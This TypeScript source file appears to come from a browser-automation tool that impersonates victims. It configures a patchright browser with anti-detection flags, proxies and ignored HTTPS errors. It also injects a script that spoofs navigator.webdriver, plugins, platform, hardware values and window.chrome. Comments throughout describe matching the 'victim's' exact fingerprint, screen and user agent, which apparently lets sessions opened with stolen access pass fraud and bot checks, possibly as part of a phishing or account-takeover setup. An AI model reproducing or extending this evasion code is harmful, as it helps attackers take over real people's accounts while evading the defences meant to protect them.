import { LaunchOptions, BrowserContextOptions } from 'patchright';
import { logger } from '../../utils/logger.util';

export interface BrowserFingerprint {
  userAgent?: string;
  language?: string;
  languages?: string[];
  colorDepth?: number;
  screenWidth?: number;
  screenHeight?: number;
  availWidth?: number;
  availHeight?: number;
  timezone?: string;
  platform?: string;
  hardwareConcurrency?: number;
  deviceMemory?: number;
  pixelRatio?: number;
}

/**
 * Browser launch configuration with anti-detection
 */
export const getBrowserLaunchConfig = (
  proxy?: {
    server: string;
    username?: string;
    password?: string;
  },
  fingerprint?: BrowserFingerprint
): LaunchOptions => {
  logger.info(`[CONFIG DEBUG] Building launch config, headless will be: ${process.env.PLAYWRIGHT_HEADLESS ?? 'not set from env'}, NODE_ENV=${process.env.NODE_ENV ?? 'not set'}`);
  
  const args = [
    '--display=:99',
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-blink-features=AutomationControlled',
    '--disable-automation',
    '--no-first-run',
    '--no-default-browser-check',
    '--disable-infobars',
    '--mute-audio',
  ];

  // Set window size from victim's screen if available
  const width = fingerprint?.screenWidth || 1366;
  const height = fingerprint?.screenHeight || 768;
  args.push(`--window-size=${width},${height}`);

  const config: LaunchOptions = {
    headless: false, // Non-headless mode for debugging
    
    args,
    
    // Timeout
    timeout: 60000, // 60 seconds
  };

  // Add proxy if provided
  if (proxy) {
    config.proxy = {
      server: proxy.server,
      username: proxy.username, 
      password: proxy.password,
    };
  }

  return config;
};

/**
 * Browser context configuration
 * IMPORTANT: Always present as neutral US session - no victim timezone/geolocation
 */
export const getBrowserContextConfig = (fingerprint?: BrowserFingerprint): BrowserContextOptions => {
  // Use victim's fingerprint or fallback to defaults
  const width = fingerprint?.screenWidth || 1366;
  const height = fingerprint?.screenHeight || 768;

  if (fingerprint) {
    logger.info(`[FINGERPRINT] Applying context: ${width}x${height}, neutral US locale`);
  }

  return {
    viewport: {
      width,
      height,
    },
    
    // Always use neutral US locale (never victim's locale/timezone)
    locale: 'en-US',
    timezoneId: 'America/New_York',
    
    // Ignore HTTPS errors
    ignoreHTTPSErrors: true,
    
    // Set device scale factor from victim's pixel ratio
    deviceScaleFactor: fingerprint?.pixelRatio || 1,
    ...(fingerprint?.userAgent ? { userAgent: fingerprint.userAgent } : {}),
  };
};

/**
 * Stealth settings to avoid detection
 */
export const applyStealthSettings = async (page: any, fingerprint?: BrowserFingerprint) => {
  const languages = fingerprint?.languages || ['en-US', 'en'];
  const platform = fingerprint?.platform || 'Win32';
  const hardwareConcurrency = fingerprint?.hardwareConcurrency || 4;
  const deviceMemory = fingerprint?.deviceMemory || 8;
  const colorDepth = fingerprint?.colorDepth || 24;

  // Override navigator properties and permissions to avoid detection
  // Match victim's exact browser fingerprint
  await page.addInitScript(`
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
    Object.defineProperty(navigator, 'languages', { get: () => ${JSON.stringify(languages)} });
    Object.defineProperty(navigator, 'platform', { get: () => '${platform}' });
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => ${hardwareConcurrency} });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => ${deviceMemory} });
    Object.defineProperty(screen, 'colorDepth', { get: () => ${colorDepth} });
    Object.defineProperty(screen, 'pixelDepth', { get: () => ${colorDepth} });
    
    window.chrome = {
      app: {
        isInstalled: false,
        InstallState: { DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed' },
        RunningState: { CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running' }
      },
      runtime: {
        PlatformOs: { MAC: 'mac', WIN: 'win', ANDROID: 'android', CROS: 'cros', LINUX: 'linux', OPENBSD: 'openbsd' },
        PlatformArch: { ARM: 'arm', X86_32: 'x86-32', X86_64: 'x86-64' },
        OnInstalledReason: { INSTALL: 'install', UPDATE: 'update', CHROME_UPDATE: 'chrome_update' }
      },
      loadTimes: function() {},
      csi: function() { return { startE: Date.now(), onloadT: Date.now(), pageT: 0.1, tran: 15 }; }
    };
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) =>
      parameters.name === 'notifications'
        ? Promise.resolve({ state: 'denied' })
        : originalQuery(parameters);
  `);
};

/**
 * Profile browser launch config (for technician/admin viewing)
 */
export const getProfileBrowserConfig = (profilePath: string, proxy?: {
  server: string;
  username?: string;
  password?: string;
}): LaunchOptions => {
  const config: LaunchOptions = {
    headless: false, // Always visible for profile viewing
    
    args: [
      '--disable-blink-features=AutomationControlled',
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--window-size=1920,1080',
    ],
    
    // Use persistent context (saved profile)
    // This will be handled in profile-manager.service.ts
    
    timeout: 60000,
  };

  if (proxy) {
    config.proxy = {
      server: proxy.server,
      username: proxy.username,
      password: proxy.password,
    };
  }

  return config;
};
